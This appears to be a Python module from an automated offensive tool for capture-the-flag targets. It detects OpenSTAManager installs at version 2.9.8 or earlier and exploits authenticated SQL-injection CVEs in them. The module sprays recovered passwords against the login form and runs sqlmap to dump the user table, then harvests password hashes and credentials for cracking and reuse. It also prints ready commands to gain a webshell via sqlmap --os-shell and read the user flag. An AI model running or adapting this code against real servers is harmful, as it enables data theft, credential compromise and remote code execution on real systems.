"""OpenSTAManager fingerprint + authenticated SQL-injection exploitation.

OpenSTAManager (devcode-it/openstamanager) is an Italian technical-assistance /
invoicing app. A box that hands you a support-portal login is staging an
*authenticated* SQLi, not "browse the tickets." Version 2.9.8 and earlier carry
a cluster of authenticated SQL-injection CVEs (published 2026):

  * CVE-2026-24418  error-based SQLi, Scadenzario bulk ops
                    (POST id_records[] -> actions.php?id_module=18)
  * CVE-2026-24419  error-based SQLi, Prima Nota (GET id_documenti -> add.php)
  * CVE-2025-69214  SQLi, ajax_select.php `componenti` (options[matricola])
  * CVE-2026-24417  time-based blind SQLi w/ amplified DoS (ajax_search term)

The error-based ones dump the whole DB (the `zz_users` table = admin hash and
every portal login) and, where MySQL FILE priv + a writable webroot line up,
give RCE via SELECT ... INTO OUTFILE (drop a PHP webshell) -> the user flag.

Auto-exploitation (--exploit) uses ONLY the error-based extraction CVEs and the
webshell-via-OUTFILE path. The time-based blind CVE (CVE-2026-24417) is a DoS
amplifier and is NEVER auto-fired — it's named in the finding for manual use.

Detection is unauthenticated (page markers / version files). Extraction needs a
portal login, which scryer recovers upstream (the reuse spray -> a second
mailbox -> the OpenSTAManager credentials).
"""

from __future__ import annotations

import http.cookiejar
import os
import re
import ssl
import subprocess
import urllib.error
import urllib.parse
import urllib.request
from typing import List, Optional, Tuple

from ...core import utils, tooling
from ...core.report import HostReport, Finding

# Fixed in 2.9.9 for the 2026 cluster; treat <= 2.9.8 as vulnerable, and an
# unknown version as only *potentially* vulnerable (report, never auto-fire).
_FIXED = (2, 9, 9)


def run(host: HostReport, opts) -> None:
    seen = host.__dict__.setdefault("_opensta_done", set())
    for scheme, hoststr, port in _web_targets(host):
        key = (hoststr, port)
        if key in seen:
            continue
        base, version = _detect(scheme, hoststr, port)
        if base is None:
            continue
        seen.add(key)
        _report(host, base, hoststr, version)
        if getattr(opts, "exploit", False) and _vulnerable(version):
            _exploit(host, base, hoststr, version)


# --------------------------------------------------------------------------
def _detect(scheme: str, vhost: str, port: int) -> Tuple[Optional[str], str]:
    """Return (base_url, version) if this is OpenSTAManager, else (None, '')."""
    base = f"{scheme}://{vhost}:{port}"
    for sub in ("", "/index.php", "/?action=login"):
        body = _get(base + sub, vhost)
        if body and _is_opensta(body):
            return base, _version(base, vhost, body)
    # common sub-directory install
    for sub in ("/openstamanager", "/gestionale", "/osm"):
        body = _get(base + sub + "/", vhost)
        if body and _is_opensta(body):
            return base + sub, _version(base + sub, vhost, body)
    return None, ""


def _is_opensta(body: str) -> bool:
    low = body.lower()
    return ("openstamanager" in low
            or "open sta manager" in low
            or ("id_module" in low and "actions.php" in low)
            or 'name="username"' in low and "osm" in low)


def _version(base: str, vhost: str, root: str) -> str:
    # 1) explicit version files shipped with the app
    for path in ("/VERSION", "/composer.json", "/composer.lock",
                 "/CHANGELOG.md", "/update/VERSION"):
        body = _get(base + path, vhost)
        if not body:
            continue
        m = (re.search(r'"devcode-it/openstamanager"\s*:\s*"[^\d]*(\d+\.\d+\.\d+)', body)
             or re.search(r'"version"\s*:\s*"[^\d]*(\d+\.\d+\.\d+)', body)
             or re.search(r"(\d+\.\d+\.\d+)", body))
        if m:
            return m.group(1)
    # 2) version printed in the page footer / meta
    for pat in (r"OpenSTAManager[^0-9]{0,20}(\d+\.\d+\.\d+)",
                r'version["\']?\s*[:=]\s*["\']?(\d+\.\d+\.\d+)'):
        m = re.search(pat, root, re.I)
        if m:
            return m.group(1)
    return "unknown"


def _vulnerable(version: str) -> bool:
    """Only a CONFIRMED <= 2.9.8 auto-fires (learned the Roundcube lesson: never
    exploit a version we couldn't read)."""
    if version == "unknown":
        return False
    parts = [int(x) for x in re.findall(r"\d+", version)[:3]]
    while len(parts) < 3:
        parts.append(0)
    return tuple(parts) < _FIXED


# --------------------------------------------------------------------------
def _report(host: HostReport, base: str, vhost: str, version: str) -> None:
    utils.section(f"OPENSTAMANAGER {vhost}")
    vuln = _vulnerable(version)
    logins = _portal_logins(host)
    cred_line = (f"You already hold a portal login ({logins[0]}) — this is "
                 "authenticated SQLi." if logins
                 else "Log in first (reuse spray / a looted portal credential), "
                      "then extract.")
    if vuln:
        utils.log("hot", f"OpenSTAManager {version} — authenticated SQLi cluster "
                         "(CVE-2026-24418/24419, CVE-2025-69214)", indent=1)
        host.add(Finding(
            title="OpenSTAManager authenticated SQLi (CVE-2026-24418)",
            detail=_playbook(base, version, logins) + "\n\n" + cred_line,
            severity="critical", category="vuln", port=_port(base),
            service="http", evidence=f"OpenSTAManager {version}"))
    else:
        utils.log("info", f"OpenSTAManager {version} detected "
                          f"({'version hidden' if version == 'unknown' else 'check vs 2.9.8'})",
                  indent=1)
        host.add(Finding(
            title=f"OpenSTAManager {version}",
            detail=f"OpenSTAManager at {base}. {cred_line} If <= 2.9.8 it is "
                   "vulnerable to authenticated SQLi (CVE-2026-24418 Scadenzario, "
                   "CVE-2026-24419 Prima Nota, CVE-2025-69214 ajax_select); "
                   "confirm the version (/composer.json, footer).",
            severity="high" if logins else "medium", category="web",
            port=_port(base), service="http", confidence="potential",
            evidence=f"OpenSTAManager {version}"))


def _playbook(base: str, version: str, logins: List[str]) -> str:
    login = logins[0] if logins else "<user>:<pass>"
    user, _, pw = login.partition(":")
    pw = pw or "<pass>"
    return (
        f"OpenSTAManager {version} at {base} — authenticated error-based SQLi in "
        "the Scadenzario bulk-ops module (CVE-2026-24418). Dump the DB (the "
        "`zz_users` table = admin hash + every portal login), then RCE via "
        "SELECT ... INTO OUTFILE where FILE priv + a writable webroot allow.\n\n"
        "# 1) log in, keep the session cookie:\n"
        f"curl -s -c osm.cookies -d 'username={user}&password={pw}' {base}/index.php\n"
        "# 2) authenticated SQLi -> dump users with sqlmap:\n"
        f"sqlmap -u '{base}/actions.php?id_module=18' --load-cookies=osm.cookies "
        "--data='op=bulk&id_records[]=1&id_plugin=1' -p 'id_records[]' "
        "--batch --dbms=mysql --dump -T zz_users\n"
        "# 3) RCE (if FILE priv): drop a webshell, then hit it for the flag:\n"
        f"sqlmap -u '{base}/actions.php?id_module=18' --load-cookies=osm.cookies "
        "--data='op=bulk&id_records[]=1&id_plugin=1' -p 'id_records[]' "
        "--batch --os-shell\n"
        "# -> id; cat /home/*/user.txt ; sudo -l   (then OliveTin/GTFOBins to root)")


# --------------------------------------------------------------------------
# active exploitation (--exploit): authenticated error-based extraction only.
# Never fires the time-based DoS CVE.
# --------------------------------------------------------------------------
def _exploit(host: HostReport, base: str, vhost: str, version: str) -> bool:
    logins = _portal_logins(host)
    if not logins:
        utils.log("dim", "no portal login in hand yet — SQLi extraction needs an "
                         "authenticated session (recover one first)", indent=1)
        return False
    sqlmap = tooling.resolve("sqlmap")
    if not sqlmap:
        utils.log("warn", "sqlmap not found — the finding has the ready commands",
                  indent=1)
        return False

    for login in logins[:6]:
        user, _, pw = login.partition(":")
        user = user.split("@", 1)[0]
        if not pw:
            continue
        cookiefile = _login(base, vhost, user, pw)
        if not cookiefile:
            continue
        utils.log("hot", f"authenticated to OpenSTAManager as {user} — running "
                         "SQLi extraction (CVE-2026-24418)", indent=1)
        got = _sqlmap_dump(host, base, cookiefile)
        try:
            os.unlink(cookiefile)
        except OSError:
            pass
        if got:
            host.add(Finding(
                title="OpenSTAManager SQLi extraction (CVE-2026-24418)",
                detail=f"Authenticated error-based SQLi on {base} as {user}:{pw}. "
                       "Dumped the users table — crack/reuse the recovered hashes, "
                       "then RCE via `sqlmap --os-shell` (SELECT INTO OUTFILE) for "
                       "the user flag.", severity="critical", category="vuln",
                port=_port(base), service="http", evidence=login))
            return True
    utils.log("dim", "could not authenticate with the known portal logins", indent=1)
    return False


def _login(base: str, vhost: str, user: str, pw: str) -> Optional[str]:
    """POST the login form, keep cookies, confirm the session is authenticated.
    Returns a Netscape cookie file path (for sqlmap --load-cookies) or None."""
    jar = http.cookiejar.MozillaCookieJar()
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(jar),
        urllib.request.HTTPSHandler(context=ctx))
    data = urllib.parse.urlencode({"username": user, "password": pw,
                                   "action": "login", "keep_alive": "on"}).encode()
    for path in ("/index.php", "/ajax_complete.php", "/"):
        try:
            req = urllib.request.Request(base + path, data=data,
                                         headers={"User-Agent": "scryer",
                                                  "Host": vhost})
            with opener.open(req, timeout=12) as resp:
                body = resp.read(60_000).decode("utf-8", "replace")
        except (urllib.error.URLError, OSError, ValueError):
            continue
        # authenticated if a session cookie was set AND the login form is gone
        has_cookie = any(c.name.upper().startswith(("OSM", "PHPSESS"))
                         for c in jar)
        if has_cookie and 'name="password"' not in body.lower():
            import tempfile
            fd, path_out = tempfile.mkstemp(prefix="osm_", suffix=".cookies")
            os.close(fd)
            try:
                jar.save(path_out, ignore_discard=True, ignore_expires=True)
                return path_out
            except OSError:
                return None
    return None


def _sqlmap_dump(host: HostReport, base: str, cookiefile: str) -> bool:
    """Run sqlmap against the Scadenzario error-based injection point, dump the
    users table, and harvest whatever credentials/hashes come back."""
    url = base + "/actions.php?id_module=18"
    argv = [tooling.resolve("sqlmap") or "sqlmap", "-u", url,
            "--load-cookies", cookiefile,
            "--data", "op=bulk&id_records[]=1&id_plugin=1",
            "-p", "id_records[]", "--dbms=mysql", "--batch",
            "--level=2", "--risk=2", "--technique=E", "--dump", "-T", "zz_users",
            "--threads", "4", "--flush-session"]
    try:
        r = subprocess.run(argv, timeout=600, capture_output=True, text=True,
                           errors="replace")
    except (OSError, subprocess.SubprocessError) as exc:
        utils.log("dim", f"sqlmap failed to run ({str(exc)[:60]})", indent=1)
        return False
    out = (r.stdout or "") + (r.stderr or "")
    if "is vulnerable" not in out.lower() and "parameter" not in out.lower():
        return False
    if "injectable" not in out.lower() and "sqlmap identified" not in out.lower() \
            and "Database:" not in out:
        # nothing extracted
        utils.log("dim", "sqlmap ran but didn't confirm the injection here",
                  indent=1)
        return False
    utils.log("hot", "SQLi confirmed — dumped OpenSTAManager users", indent=1)
    _harvest(host, out, base)
    for line in out.splitlines():
        if "|" in line and re.search(r"[0-9a-f]{32,}|\$2y\$|\$argon", line):
            utils.log("dim", "  " + line.strip()[:200], indent=1)
    return True


def _harvest(host: HostReport, out: str, base: str) -> None:
    from ...data import knowledge
    for tok in knowledge.find_flags(out or "", allow_hex=True):
        host.add(Finding(title="FLAG via OpenSTAManager SQLi", detail=tok,
                         severity="critical", category="flag",
                         port=_port(base), service="http", evidence=tok))
        bar = utils.c("╔" + "═" * 56, utils.C.GREEN, utils.C.BOLD)
        print("\n  " + bar)
        print("  " + utils.c("║ FLAG (OpenSTAManager SQLi)", utils.C.GREEN, utils.C.BOLD))
        print("  " + utils.c(f"║ {tok}", utils.C.YELLOW, utils.C.BOLD))
        print("  " + utils.c("╚" + "═" * 56, utils.C.GREEN, utils.C.BOLD) + "\n")
    for _u, pw in list(knowledge.find_conn_creds(out)):
        host.add_cred(pw)
    for _lbl, val, _sev in knowledge.extract_secrets(out):
        host.add_cred(val)
    # bcrypt/argon hashes from zz_users -> record for offline cracking / reuse
    for h in re.findall(r"\$(?:2[aby]|argon2[id]{1,2})\$[^\s|]+", out):
        host.add(Finding(
            title="OpenSTAManager password hash",
            detail=f"{h[:60]}… — crack (hashcat -m 3200 for bcrypt) then reuse.",
            severity="high", category="cred", port=_port(base), service="http",
            evidence=h[:80]))


# --------------------------------------------------------------------------
def _portal_logins(host: HostReport) -> List[str]:
    """user:pass pairs to try. Explicit pairs from findings/mail first, then the
    Cartesian of recovered passwords x candidate usernames."""
    out: List[str] = []
    seen = set()

    def add(pair: str):
        pair = pair.strip()
        if pair and ":" in pair and pair.lower() not in seen:
            seen.add(pair.lower())
            out.append(pair)

    # explicit user:pass surfaced elsewhere (mailbox logins, doc creds)
    for f in host.findings:
        blob = f"{f.title} {f.detail or ''} {f.evidence or ''}"
        for m in re.findall(r"([A-Za-z0-9._%+-]{2,40}):([^\s,;'\"]{3,40})", blob):
            add(f"{m[0]}:{m[1]}")

    users = _candidate_users(host)
    for pw in list(dict.fromkeys(host.creds))[:12]:
        for u in users[:12]:
            add(f"{u}:{pw}")
    return out[:60]


def _candidate_users(host: HostReport) -> List[str]:
    users: List[str] = ["admin", "administrator"]
    for e in host.__dict__.get("emails", set()):
        users.append(e.split("@", 1)[0])
    users += sorted(host.__dict__.get("usernames", set()))
    users += list(host.__dict__.get("ad_users", []))
    for f in host.findings:
        if f.title.startswith("Mailbox access") and f.evidence and ":" in f.evidence:
            users.append(f.evidence.split(":", 1)[0].split("@", 1)[0])
    seen, out = set(), []
    for u in users:
        u = u.strip().lower()
        if u and u not in seen:
            seen.add(u)
            out.append(u)
    return out


# --------------------------------------------------------------------------
def _web_targets(host: HostReport):
    from ...data import knowledge
    ports = [(e["port"], bool(e.get("secure")) or e["port"] in knowledge.HTTPS_PORTS)
             for e in host.open_ports
             if (e.get("service") or "").lower() in ("http", "https")
             or e["port"] in knowledge.HTTP_PORTS or e["port"] in knowledge.HTTPS_PORTS]
    names = [host.resolved_ip] + [h for h in host.hostnames
                                  if "." in h and not _is_ip(h)]
    for port, secure in ports:
        scheme = "https" if secure else "http"
        for name in dict.fromkeys(names):
            yield scheme, name, port


def _is_ip(name: str) -> bool:
    p = name.split(".")
    return len(p) == 4 and all(x.isdigit() for x in p)


def _port(base: str) -> int:
    m = re.search(r":(\d+)", base.split("//", 1)[-1])
    return int(m.group(1)) if m else 80


def _get(url: str, vhost: str, timeout: float = 8) -> str:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    req = urllib.request.Request(url, headers={"User-Agent": "scryer",
                                               "Host": vhost})
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            return resp.read(200_000).decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        try:
            return exc.read(100_000).decode("utf-8", "replace")
        except Exception:
            return ""
    except Exception:
        return ""
